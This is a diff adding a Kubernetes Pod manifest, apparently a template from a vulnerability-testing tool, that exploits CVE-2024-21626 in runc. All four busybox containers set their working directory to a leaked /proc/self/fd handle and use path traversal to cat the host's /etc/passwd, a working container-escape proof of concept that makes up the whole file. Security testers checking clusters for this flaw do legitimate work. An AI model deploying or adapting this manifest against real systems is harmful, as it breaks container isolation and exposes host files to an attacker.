@@ -1,0 +1,27 @@
+apiVersion: v1
+        kind: Pod
+        metadata:
+          name: cve-2024-21626
+        spec:
+          serviceAccountName: {serviceaccount}
+          containers:
+          - name: 2024-21626-container-1
+            image: busybox:latest
+            command: ["/bin/cat", "../../../../../../../etc/passwd"]
+            workingDir: "/proc/self/fd/6"
+            imagePullPolicy: IfNotPresent
+          - name: runc-cve-2024-21626-container-2
+            image: busybox:latest
+            command: ["/bin/cat", "../../../../../../../etc/passwd"]
+            workingDir: "/proc/self/fd/7"
+            imagePullPolicy: IfNotPresent
+          - name: runc-cve-2024-21626-container-3
+            image: busybox:latest
+            command: ["/bin/cat", "../../../../../../../etc/passwd"]
+            workingDir: "/proc/self/fd/8"
+            imagePullPolicy: IfNotPresent
+          - name: runc-cve-2024-21626-container-4
+            image: busybox:latest
+            command: ["/bin/cat", "../../../../../../../etc/passwd"]
+            workingDir: "/proc/self/fd/9"
+            imagePullPolicy: IfNotPresent
